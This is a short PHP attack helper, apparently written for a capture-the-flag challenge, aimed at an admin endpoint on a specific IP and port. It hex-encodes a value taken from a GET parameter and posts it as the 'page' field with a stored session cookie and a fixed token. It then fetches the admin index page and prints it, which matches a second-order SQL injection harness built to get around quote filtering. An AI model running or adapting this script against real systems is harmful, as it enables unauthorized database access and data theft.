<?php

error_reporting(E_ALL);

$postUrl = "http://106.39.10.134:10002/index.php?action=admin&mode=setpagenum";
$indexUrl = "http://106.39.10.134:10002/index.php?action=admin&mode=index";

function request_post($url,$param) {
        $cookieSuccess = dirname(__FILE__)."/cookie";
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$url);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 1);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
        curl_setopt($ch, CURLOPT_POST, true);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
        // CURLOPT_COOKIEJAR CURLOPT_COOKIEFILE
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieSuccess);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);
        return $data;
}

function request_get($url) {
        $cookieSuccess = dirname(__FILE__)."/cookie";
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$url);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 0);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
        curl_setopt($ch, CURLOPT_POST, 0);//post提交方式
        // CURLOPT_COOKIEJAR CURLOPT_COOKIEFILE
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieSuccess);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);
        return $data;
}

function grs($length = 10) { 
  $characters = '01234567890123456789012345678901234567890123456789'; 
  $randomString = ''; 
  for ($i = 0; $i < $length; $i++) { 
    $randomString .= $characters[rand(0, strlen($characters) - 1)]; 
  } 
  return $randomString; 
}

$g = $_GET['v'];

$data = [
    "page" => "0x".bin2hex($g),
    "TOKEN" => "hwwhwhhhhwhwwwwh"
];

request_post($postUrl,$data);
$htmlres = request_get($indexUrl);

echo $htmlres;



